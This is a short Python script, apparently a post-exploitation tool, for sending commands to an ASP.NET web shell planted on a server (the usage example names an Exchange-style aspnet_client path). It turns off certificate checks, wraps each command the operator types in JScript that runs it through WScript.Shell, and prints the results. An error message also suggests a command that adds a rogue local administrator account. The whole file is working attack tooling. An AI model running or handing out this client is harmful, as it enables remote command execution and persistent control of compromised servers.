  
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
import sys
if len(sys.argv) < 2:
	print('\r\n--------------------\n+ Author: github.com/Udyz\n+ twitter.com/lotusdll\n--------------------\n[*] USAGE: ./{file} <shell url> <password>\nex: ./{file} https://mail.local/aspnet_client/shell.aspx exec_code'.format(file=sys.argv[0]))
	exit()
url = sys.argv[1]
code = sys.argv[2]
def escape(_str):
    _str = _str.replace("'", "\\'")
    _str = _str.replace('"', '\\"')
    return _str
try:
	req_test = requests.get('%s'%(url), verify=False, timeout=5)
#	if "200" in req_test.status_code:
	if req_test.status_code == 200:
		while True:
			cmd = input('CMD: ')
			#print(escape(cmd))
			shell_body_exec = '%s=Response.Write(new ActiveXObject("WScript.Shell").exec("%s").stdout.readall());'%(code, escape(cmd))
			shell_req = requests.post('%s'%(url),headers={'Content-Type': 'application/x-www-form-urlencoded'},data=shell_body_exec,verify=False, timeout=20)
			if shell_req.status_code == 200:
				print(shell_req.text.split('!BDNp')[0])
			elif shell_req.status_code == 500:
				print('(-) AV block exec cmd or you missing \\" ex: net localgroup \\"administrators\\" mrr0b0t /add')
			else:
				print('(-) Something wrong IDK ~~')
	else:
		print('(-) Webshell not found!')
except(requests.ConnectionError, requests.ConnectTimeout, requests.ReadTimeout):
	exit(0)
except KeyboardInterrupt:
	exit(0)
